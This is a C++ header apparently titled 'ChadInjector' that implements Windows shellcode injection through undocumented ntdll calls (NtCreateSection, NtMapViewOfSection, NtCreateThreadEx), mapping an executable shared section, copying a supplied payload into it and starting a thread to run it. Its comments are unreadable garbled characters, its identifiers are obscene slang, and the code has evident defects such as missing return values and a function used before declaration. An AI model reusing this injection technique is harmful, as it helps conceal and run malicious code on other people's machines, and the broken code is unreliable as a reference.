#pragma once

// �� ������� �� ��� ��������.......
#include <Windows.h>

// ����� ����� ��� �� 90, ������.
#include <ntdef.h>

// � ���, 50 ������, ��-�� ����)
#include <winternl.h>

// ������ ��� ���, ��� ��� JavaShellCodeInjector - �� �����.
namespace ChadInjector {

	// ������� ����, �� ������.
	typedef enum TypaSektionYadroType {

		ViewShare = 1,
		ViewUnmap = 2

	};

	// � ������ �������� �������� �� ������ ��������� 2 ���, ������ ���� �������� ����� ������ �� ����.
	typedef NTSTATUS (NTAPI* VozvrastSoglasia)

	// ����� �������..
	(PHANDLE			  my,
	 ULONG                password,
	 POBJECT_ATTRIBUTES   is,
	 PLARGE_INTEGER       penis,
	 ULONG                oral,
	 ULONG                cum,
	 HANDLE               shot);


	// ������� ���-�-���, �� ���� �� ������ ������
	typedef NTSTATUS (NTAPI* OpenUretra)

	// ���������.
	(PHANDLE			  again,
	 ACCESS_MASK          oral,
	 POBJECT_ATTRIBUTES   cumshot);

	// ������� �� ������������ � �����? �������� ��� ������� �������, �� ������ �� ������ �������� ��� ����....
	typedef NTSTATUS (NTAPI* PenisKrota)

	// ������ ��� ����� ������ - �� ������ �� ������! VMProtect!
	(HANDLE					yaica,
	 HANDLE					na,
	 PVOID*					vkus,
	 ULONG					kak,
	 ULONG					yaicnii,
	 PLARGE_INTEGER			belok,
	 PULONG					kto_bi_chto_ne_govoril_a_v,
	 TypaSektionYadroType   anal,
	 ULONG					eto,
	 ULONG					ok);



	// �� �� �������� ���, ����������� �� ����....
	typedef NTSTATUS (NTAPI* CreateGachiThread) 
	
	// �� ������ ����, ������ ����.
	(PHANDLE		pus, 
	 ACCESS_MASK	tak, 
	 PVOID			pus_,
	 HANDLE			dlya,
	 PVOID			vas,
	 PVOID			eto,
	 ULONG			pustak,
	 SIZE_T			kogda_ya_viju,
	 SIZE_T			mujika,
     SIZE_T			y_menya,
	 PVOID			stoyak
	);



	// ----


	/**
	 * 
	 * ���� (���. anus � �������) � ��������� � ������ ����� ���������������� ������ ��������� ��� ��������. 
	 * ��� ������������ ��� ����, ����� ������� �� ��������� �����������, � ����� ����� ���������� ����������� � ������ ����� �� ������� �����������.
	 *
	 * �����������, �������������� � ����� ���������� ���� � �� �� ��������� ��� ��������� ������ � ������ �������, 
	 * � ����� ��� ���������� � ������������ ���, ��� ���������� ������.
	 *
	 * � ������������� ������������� ����� ���� ������, ������� ����� ���������� ������������ �� ����� ������ ��������. 
	 * 
	 **/

	HANDLE InterceptAnusHook (HANDLE kavkaz, BYTE* talib, UINT64 mocha) {

		// ����� ������, ������� Enter, ��� ���� ���� ������ ��� �� ������������� ������ ��������.
		HANDLE najmiEnter;

		// ����� ������ ��� ����� ��� ���� �������� ����.
		OBJECT_ATTRIBUTES balls;

		// ��� � �� �����, ������� ������ ����. ����, ��������� �� ����������, �� ������� ����.
		UNICODE_STRING navalny;

		// ����� ����� �� �������, ����� �� �������...
		RtlInitUnicodeString (&navalny, L"Yaicki");

		// ���������, ��� ��� �� ��������, � � ������� ������.
		InitializeObjectAttributes (&balls, &navalny, 0, 0, 0);

		// ������� �������, ������� ��������� � �����...
		LARGE_INTEGER meibiBeibi;

		// ������ �� ����� �� �������.
		meibiBeibi.QuadPart = mocha + 0x1000;
		
		// � ����� �� ��� ������ ������������ ��� ���� ��� � ������?...
		reinterpret_cast <VozvrastSoglasia> (GetProcAddress (GetModuleHandleA ("ntdll"), "NtCreateSection")) (&najmiEnter, SECTION_ALL_ACCESS, &balls, &meibiBeibi, PAGE_EXECUTE_READWRITE, SEC_COMMIT | SEC_RESERVE, 0);

		//
		// �����, ������ �������, ������ � ����� ������� ��� �������� ������.
		// � �� ����� - �������� �������� ����������.
		//

		// ������� �������, ���...
		PVOID doprigalsa;

		// �� ���� ������ ���� �������� ��������)
		SIZE_T smotri;

		// ��� ������ �� ��� ������)
		//
		// ������ ���� ���: -1 = 0xFFFFFFF = CurrentProcessHandle.

		reinterpret_cast <PenisKrota> (GetProcAddress (GetModuleHandleA ("ntdll"), "NtMapViewOfSection")) (najmiEnter, HANDLE (-1), &doprigalsa, 0, meibiBeibi.QuadPart, &meibiBeibi, &smotri, ViewShare, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		// ��� �� ����)
		memcpy (doprigalsa, talib, mocha);

		// ����������� (������� ������� �����) �����.
		HANDLE anusBobraExtraVaginal;

		// ���� ����� ���������� ������ ����� Heaven's gate � wow64cpu �.� x32.
		// ������ ������ ���� ����� � ����� ���.
		//
		// ��� ������ ����� ���������� �����))))))))

		reinterpret_cast <CreateGachiThread> (GetProcAddress (GetModuleHandleA ("ntdll"), "NtCreateThreadEx")) (&anusBobraExtraVaginal, THREAD_ALL_ACCESS, 0, kavkaz, XuiKrota, 0, 0x2 | 0x4, 0, 0x1000, 0x1000, 0);

	}

	DWORD WINAPI XuiKrota (LPVOID netyTakogo) {

		// ����� ��� �����������: 500 �����.
		PVOID tankiOnline;

		// � ����� ������ �� ������� ���� ����-�������?
		OBJECT_ATTRIBUTES ochkoEja;

		// ����� ������ ��������)
		UNICODE_STRING jopa;

		// ������� ���� �������� � �����, ����.
		RtlInitUnicodeString (&jopa, L"Yaicki");

		// � ����� ������� ��� � ���))))
		InitializeObjectAttributes (&ochkoEja, &jopa, 0, 0, 0);

		// ������� ��� ��������)))
		reinterpret_cast <OpenUretra> (GetProcAddress (GetModuleHandleA ("ntdll"), "NtOpenSection")) (&tankiOnline, SECTION_ALL_ACCESS, &ochkoEja);

		// ����� �� ������.
		PVOID hacker;

		// ������ �������� �����)
		SIZE_T tankiOffline;

		// ��� �����-�� �����, � ������ ����� � ��������.
		reinterpret_cast <PenisKrota> (GetProcAddress (GetModuleHandleA ("ntdll"), "NtMapViewOfSection")) (tankiOnline, HANDLE (-1), &hacker, 0, 0x1000, 0, 0, ViewShare, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		// ��� �� ����� ���� ������� ������, ��������������.
		reinterpret_cast <void (__thiscall*) ()> (hacker) ();


	}

}